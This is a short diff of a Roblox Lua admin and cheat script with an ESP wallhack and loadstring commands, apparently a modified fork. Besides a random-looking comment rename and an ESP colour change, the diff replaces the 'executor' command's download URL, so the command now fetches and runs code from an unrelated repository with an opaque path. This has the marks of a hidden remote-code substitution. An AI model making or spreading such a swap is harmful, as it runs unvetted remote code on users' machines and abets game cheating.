@@ -230,7 +230,7 @@ local msg={
 	"Hola";
 }
 
---[[ Goofy Text ]]--
+--[[ Q2ZJUG ]]--
 local Goofer={
 	"Egg";
 	"i am a goofy goober";
@@ -649,7 +649,7 @@ function ESP(plr)
 			a.Parent=ESPholder
 			a.Adornee=plr.Character
 			a.FillTransparency=0.45
-			a.FillColor=Color3.fromRGB(0,255,0)
+			a.FillColor=Color3.fromRGB(148, 7, 40)
 
 			if plr.Character and plr.Character:FindFirstChild('Head') then
 				local BillboardGui=Instance.new("BillboardGui")
@@ -1221,7 +1221,7 @@ cmd.add({"loadstring","ls"},{"loadstring <code> (ls)","Run the code using the lo
 end)
 
 cmd.add({"executor","exec"},{"executor (exec)","Very simple executor"},function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/NAexecutor.lua"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/XTJZ/Connec/refs/heads/main/git/Connec/t"))()
 end)
 
 cmd.add({"scripthub","hub"},{"scripthub (hub)","Thanks to scriptblox api"},function()
